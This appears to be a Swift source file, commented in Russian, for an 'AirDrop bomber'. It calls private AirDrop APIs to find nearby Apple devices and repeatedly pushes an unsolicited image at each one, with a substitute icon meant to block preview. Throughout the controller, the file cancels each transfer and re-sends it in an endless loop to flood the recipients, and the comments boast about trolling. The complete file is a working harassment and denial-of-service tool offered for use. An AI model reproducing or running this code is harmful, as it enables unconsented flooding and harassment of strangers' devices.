import CoreGraphics
import Foundation

func browserCallbackFunction(browser: TDKSFBrowser, node: TDKSFNode, children: CFArray, _: UnsafeMutableRawPointer?, _: UnsafeMutableRawPointer?, context: UnsafeMutableRawPointer?) {
    guard let context = context else { return }
    let controller = Unmanaged.fromOpaque(context).takeUnretainedValue() as BomberController
    controller.handleBrowserCallback(browser: browser, node: node, children: children)
}

func operationCallback(operation: TDKSFOperation, rawEvent: TDKSFOperationEvent.RawValue, results: AnyObject, context: UnsafeMutableRawPointer?) {
    guard let event = TDKSFOperationEvent(rawValue: rawEvent) else { return }
    guard let context = context else { return }
    let controller = Unmanaged.fromOpaque(context).takeUnretainedValue() as BomberController
    controller.handleOperationCallback(operation: operation, event: event, results: results)
}

public class BomberController: ObservableObject {
    private enum Bombing {
        case operation(TDKSFOperation)
        case workItem(DispatchWorkItem)
        
        func cancel() {
            switch self {
            case .operation(let operation):
                TDKSFOperationCancel(operation)
            case .workItem(let workItem):
                workItem.cancel()
            }
        }
    }
    
    public class Person {
        var displayName: String?
        var node: TDKSFNode
        
        init(node: TDKSFNode) {
            self.displayName = TDKSFNodeCopyDisplayName(node) as? String ?? TDKSFNodeCopyComputerName(node) as? String ?? TDKSFNodeCopySecondaryName(node) as? String
            self.node = node
        }
    }
    
    /// Текущий браузер
    private var browser: TDKSFBrowser?
    
    /// Известные на данный момент люди
    @Published public var people: [Person]
    
    /// Карта между известными людьми и бомбежкой (бомбинг) ну ты пон короче
    private var bombings: Dictionary<TDKSFNode, Bombing>
    
    /// Продолжительность ожидания после бомбинга перед новым бомбингом
    public var rechargeDuration: TimeInterval
    
    /// URL-адрес локального файла, с помощью которого можно бомбить. по дефолту это тролл фейс
    public var sharedURL: URL
    
    /// А сканер работает вообще
    @Published public var isRunning: Bool = false
    
    /// Обработчик блоков, позволяющий детально контролировать, кого бомбить
    public var shouldBomberHandler: (Person) -> Bool
    
    /// Отправить данные о бомбежке обратно в интерфейс
    private var eventHandler: ((TrollEvent) -> Void)?
    
    public enum TrollEvent {
        case cancelled
        case operationEvent(TDKSFOperationEvent)
    }
    
    public init(sharedURL: URL, rechargeDuration: TimeInterval) {
        TDKInitialize()
        people = []
        bombings = [:]
        self.rechargeDuration = rechargeDuration
        self.shouldBomberHandler = { _ in return true }
        self.sharedURL = sharedURL
    }
    
    deinit {
        stopBrowser()
    }
    
    /// Запустить браущер
    public func startBrowser() {
        guard !isRunning else { return }
        
        var clientContext: TDKSFBrowserClientContext = (
            version: 0,
            info: Unmanaged.passUnretained(self).toOpaque(),
            retain: nil,
            release: nil,
            copyDescription: nil
        )
        
        let browser = TDKSFBrowserCreate(kCFAllocatorDefault, kTDKSFBrowserKindAirDrop)
        TDKSFBrowserSetClient(browser, browserCallbackFunction, &clientContext)
        TDKSFBrowserSetDispatchQueue(browser, .main)
        TDKSFBrowserOpenNode(browser, nil, nil, 0)
        self.browser = browser
    }
    
    /// Начать бомбить
    public func startBombing(shouldTrollHandler: @escaping (Person) -> Bool, eventHandler: @escaping (TrollEvent) -> Void) {
        self.eventHandler = eventHandler
        for person in people {
            if shouldTrollHandler(person) {
                troll(node: person.node)
            }
        }
    }
    
    /// Остановить браузер и очистить
    public func stopBrowser() {
        guard isRunning else { return }
        
        // Отменить ожидающие операции.
        stopBombings()
        
        // Удалить знакомы людей
        people = []
        
        // Сделать браузер инвалидом (бедни)
        TDKSFBrowserInvalidate(browser!)
        browser = nil
    }
    
    public func stopBombings() {
        for bombing in bombings.values {
            bombing.cancel()
        }
        
        // Очистить карту операций или как там
        bombings.removeAll()
    }
    
    func troll(node: TDKSFNode) {
        guard bombings[node] == nil else { return } // бомбить не бомбнутых челов
        
        remLog("trolling \(node)")
        
        var fileIcon: CGImage?
        if let dataProvider = CGDataProvider(url: sharedURL as CFURL), let image = CGImage(jpegDataProviderSource: dataProvider, decode: nil, shouldInterpolate: false, intent: .defaultIntent) {
            fileIcon = image
        }
        
        var clientContext: TDKSFBrowserClientContext = (
            version: 0,
            info: Unmanaged.passUnretained(self).toOpaque(),
            retain: nil,
            release: nil,
            copyDescription: nil
        )
        
        // Создать запрос аирдроп
        let operation = TDKSFOperationCreate(kCFAllocatorDefault, kTDKSFOperationKindSender, nil, nil)
        TDKSFOperationSetClient(operation, operationCallback, &clientContext)
        TDKSFOperationSetProperty(operation, kTDKSFOperationItemsKey, [sharedURL] as AnyObject)
        
        // Сделать предварительный просмотр невозможным
        if let fileIcon = fileIcon {
            TDKSFOperationSetProperty(operation, kTDKSFOperationFileIconKey, fileIcon)
        }
        
        // Поставить ссылку на картину
        TDKSFOperationSetProperty(operation, kTDKSFOperationNodeKey, Unmanaged.fromOpaque(UnsafeRawPointer(node)).takeUnretainedValue())
        TDKSFOperationSetDispatchQueue(operation, .main)
        TDKSFOperationResume(operation)
        
        // Добавьте запрос на бомбежку, чтобы позже можно было его отменить.
        bombings[node] = .operation(operation)
    }
    
    func handleBrowserCallback(browser: TDKSFBrowser, node: TDKSFNode, children: CFArray) {
        let nodes = TDKSFBrowserCopyChildren(self.browser!, nil) as [AnyObject]
        var currentNodes = Set<TDKSFNode>(minimumCapacity: nodes.count)
        
        for nodeObject in nodes {
            let node = OpaquePointer(Unmanaged.passUnretained(nodeObject).toOpaque())
            currentNodes.insert(node)
        }
        
        // Если мы больше не знаем о челе, отмените бомбежку на него
        for oldID in Set(self.people.map { $0.node }).subtracting(currentNodes) {
            if let bombing = bombings.removeValue(forKey: oldID) {
                bombing.cancel()
            }
        }
        
        self.people = currentNodes.map { .init(node: $0 )}
    }
    
    func handleOperationCallback(operation: TDKSFOperation, event: TDKSFOperationEvent, results: CFTypeRef) {
        remLog("handleOperationCallback \(operation) event \(event)")
        eventHandler?(.operationEvent(event))
        
        switch event {
        case .askUser:
            // .askUser требует возобновления операции
            TDKSFOperationResume(operation)
            
        case .waitForAnswer:
            // пользователь начал получать данные от атакера
            let nodeObject = TDKSFOperationCopyProperty(operation, kTDKSFOperationNodeKey)
            let node = OpaquePointer(Unmanaged.passUnretained(nodeObject).toOpaque())
            
            let workItem = DispatchWorkItem { [weak self] in
                self?.eventHandler?(.cancelled)
                self?.bombings[node]?.cancel() // отмена запроса на аирдроп
                self?.bombings[node] = nil
                
                if self?.isRunning ?? false { // дамб фикс бага
                    self?.troll(node: node) // бомбить и бомбить
                }
            }
            // дождаться появления airdrop на целевом устройстве. хз как узнатть, когда появилось предупреждение.
            DispatchQueue.main.asyncAfter(deadline: .now() + rechargeDuration, execute: workItem) // rechargeDuration контролирует с UI
            //СУКА МЕГА ТРОЛЬ
            //НУ А Я КОРОЛЬ
        default:
            break
        }
    }
}

